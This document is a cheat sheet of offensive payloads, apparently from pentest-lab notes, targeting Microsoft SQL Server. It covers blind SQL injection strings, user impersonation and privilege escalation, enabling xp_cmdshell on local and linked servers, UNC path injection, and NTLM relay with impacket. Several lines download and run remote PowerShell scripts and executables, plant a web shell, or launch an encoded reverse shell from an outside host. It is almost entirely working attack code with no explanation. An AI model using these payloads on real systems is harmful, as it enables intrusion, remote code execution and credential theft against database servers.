a**Exploiting blind sqli**
```sql
' or '1'='1

' or '1'='1'--

' or '1'='1';

' order by 1-200--

1' UNION SELECT table_name,table_name FROM information_schema.tables--

#-stacked queries-#

' or '1'='1'; EXECUTE AS USER = 'dbo';--

' or '1'='1'; WAITFOR DELAY '0:0:5';--

' or '1'='1'; EXECUTE AS LOGIN = 'sa'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC master.dbo.sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'powershell -c wget http://192.168.49.110/ps-hollow.exe -o C:\Windows\Tasks\ps-hollow.exe' ;--

' or '1'='1'; EXECUTE AS LOGIN = 'sa'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC master.dbo.sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'C:\Windows\Tasks\ps-hollow.exe' ;--

' or '1'='1'; EXECUTE AS LOGIN = 'sa'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC master.dbo.sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'C:\Windows\Tasks\ps-hollow.exe' ;--


' or '1'='1'; EXECUTE AS LOGIN = 'sa'; RECONFIGURE;--

' or '1'='1'; EXECUTE AS LOGIN = 'sa'; EXEC master.dbo.sp_configure 'xp_cmdshell', 1;--

' or '1'='1'; RECONFIGURE ;--

' or '1'='1'; EXECUTE AS LOGIN = 'sa'; EXEC sp_serveroption 'DB01', 'rpc out', 'true' ;--

' or '1'='1'; select SYSTEM_USER;--

' or '1'='1'; EXEC xp_cmdshell "powershell IEX(New-Object Net.webclient).downloadString('http://192.168.49.110/run2.ps1')" ;--

' or '1'='1'; EXEC xp_cmdshell "powershell -c IEX(New-Object Net.webclient).downloadFile('http://192.168.49.110/met.aspx','C:\inetpub\wwwroot\met.aspx')" ;--

' or '1'='1'; EXEC xp_cmdshell "ping -n 3 192.168.49.110" ;--


' or '1'='1'; exec master.dbo.xp_dirtree '\\192.168.49.110\any\thing';--

' or '1'='1'; EXECUTE AS LOGIN = 'sa'; EXEC xp_cmdshell "powershell IEX(New-Object Net.webclient).downloadFile('http://192.168.49.110/met.aspx','C:\inetpub\wwwroot\met.aspx')" ;--
```

**MSSQL Enumerate**
```SQL
select system_user --enumerate current user

SELECT USER_NAME() --enumerate current user using db

SELECT IS_SRVROLEMEMBER('sysadmin') --enumerate if user has a specified role

SELECT name AS [Login Name], type_desc AS [Account Type] FROM sys.server_principals WHERE TYPE IN ('U', 'S', 'G') and name not like '%##%' ORDER BY name, type_desc --enumerate users

SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE' --enumerate users to impersonate

EXECUTE AS LOGIN = 'dev_lab' --privesc
EXECUTE AS LOGIN = 'COWMOTORS-INT\web01$'

exec sp_linkedservers --enumerate linked servers

EXEC sp_serveroption 'DB02', 'rpc out', 'true' --enable RPC

EXEC sp_configure 'show advanced options', 1 --enable xpcmdshell
```

**MSSQL Exploitation**
```SQL

exec master.dbo.xp_dirtree '\\192.168.49.83\any\thing' --UNC path injection

EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE;') AT DB01
EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT SQL27 --enable xp_cmdshell at a linked server

EXEC ('xp_cmdshell ''whoami'';') AT db02 --cmd injection 
EXEC ('xp_cmdshell ''powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQAOQAuADEANgA1AC8AcgB1AG4AMgAuAHAAcwAxACcAKQAgAHwAIABJAEUAWAA='';') AT sql53 --reverse shell from code execution

```

**MSSQL Path Relay**
```Powershell

Exec master.dbo.xp_dirtree '\\192.168.49.110\any\thing'

$text = "(New-Object System.Net.WebClient).DownloadString('http://192.168.49.165/run2.ps1') | IEX"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($text)
$EncodedText = [Convert]::ToBase64String($bytes)
$EncodedText #encoding script

sudo proxychains impacket-ntlmrelayx --no-http-server -smb2support -t 172.16.165.151 -c 'powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQAOQAuADEANgA1AC8AcgB1AG4AMgAuAHAAcwAxACcAKQAgAHwAIABJAEUAWAA=' #ntlmrelayx

```